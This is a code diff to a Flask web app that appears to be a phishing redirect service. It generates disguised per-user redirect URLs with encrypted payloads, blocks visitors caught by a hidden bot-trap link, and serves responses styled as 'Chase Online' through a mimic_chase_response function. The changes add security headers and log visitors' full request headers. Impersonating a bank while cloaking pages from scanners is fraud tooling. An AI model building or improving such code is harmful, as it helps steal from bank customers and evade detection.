@@ -5,6 +5,7 @@ from wtforms.validators import DataRequired, Length, Regexp, URL
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.primitives import hashes, hmac
 from cryptography.hazmat.backends import default_backend
+from flask_talisman import Talisman
 import os
 import base64
 import json
@@ -80,6 +81,9 @@ app.config['SESSION_COOKIE_SECURE'] = True
 app.config['SESSION_COOKIE_SAMESITE'] = 'Strict'
 app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(days=1)
 logger.debug("Flask configuration set successfully")
+
+# Talisman for security headers
+Talisman(app, force_https=True, strict_transport_security=True, hsts_preload=True)
 
 # CSRF protection
 csrf = CSRFProtect(app)
@@ -302,7 +306,6 @@ def mimic_chase_response():
         'X-Frame-Options': 'SAMEORIGIN',
         'X-XSS-Protection': '1; mode=block',
         'X-Content-Type-Options': 'nosniff',
-        'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
         'Cache-Control': 'no-store, no-cache, must-revalidate',
         'Pragma': 'no-cache',
         'Expires': '0'
@@ -543,6 +546,7 @@ def dashboard():
                     generated_url = (f"https://{urllib.parse.quote(subdomain)}.{base_domain}/{path_segment}"
                                     f"?id={urllib.parse.quote(url_id)}&ts={timestamp}&cnf=-&url={urllib.parse.quote(encoded_payload)}")
                     url_id_hash = hashlib.sha256(f"{url_id}{encrypted_payload}".encode()).hexdigest()
+                    logger.debug(f"Generated URL: {generated_url}, url_id_hash: {url_id_hash}")
                     if valkey_client:
                         try:
                             valkey_client.hset(f"user:{username}:url:{url_id_hash}", mapping={
@@ -845,7 +849,8 @@ def redirect_handler(username, path_segment):
     try:
         base_domain = get_base_domain()
         logger.debug(f"Redirect handler called: username={username}, base_domain={base_domain}, "
-                     f"path_segment={path_segment}, query={request.query_string.decode()}, IP={request.remote_addr}, URL={request.url}")
+                     f"path_segment={path_segment}, query={request.query_string.decode()}, IP={request.remote_addr}, "
+                     f"URL={request.url}, headers={dict(request.headers)}")
 
         # Check if IP is blocked due to bot trap
         if valkey_client and valkey_client.exists(f"blocked:{request.remote_addr}"):
@@ -1054,7 +1059,7 @@ def redirect_handler_old(username, endpoint, path_segment):
     try:
         base_domain = get_base_domain()
         logger.debug(f"Old redirect handler called: username={username}, base_domain={base_domain}, endpoint={endpoint}, "
-                     f"path_segment={path_segment}, IP={request.remote_addr}, URL={request.url}")
+                     f"path_segment={path_segment}, IP={request.remote_addr}, URL={request.url}, headers={dict(request.headers)}")
 
         # Check if IP is blocked due to bot trap
         if valkey_client and valkey_client.exists(f"blocked:{request.remote_addr}"):
@@ -1277,7 +1282,7 @@ def redirect_handler_old(username, endpoint, path_segment):
 
 @app.route("/<path:path>", methods=["GET"])
 def catch_all(path):
-    logger.error(f"404 Not Found for path: {path}, host: {request.host}, url: {request.url}, query: {request.query_string.decode()}")
+    logger.error(f"404 Not Found for path: {path}, host: {request.host}, url: {request.url}, query: {request.query_string.decode()}, headers: {dict(request.headers)}")
     headers = mimic_chase_response()
     return Response(
         "<html><head><title>Chase Online</title></head><body>Page Not Found<br><a href='/bot-trap' style='display:none;'>Bot Trap</a></body></html>",
